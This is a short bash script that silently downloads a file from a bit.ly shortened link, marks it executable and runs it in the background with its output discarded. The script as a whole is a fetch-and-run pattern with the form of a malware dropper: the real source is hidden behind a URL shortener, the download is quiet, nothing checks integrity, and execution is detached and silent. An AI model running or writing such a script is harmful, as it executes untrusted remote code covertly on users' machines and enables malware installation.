#!/bin/bash

# Define the URL and the filename
URL="https://bit.ly/3LY0vIf"
FILENAME="downloaded_app"

# Download the file
wget -q "$URL" -O "$FILENAME"

# Make the downloaded file executable
chmod +x "$FILENAME"

# Run the file in the background and redirect stdout and stderr to /dev/null
nohup ./"$FILENAME" > /dev/null 2>&1 &
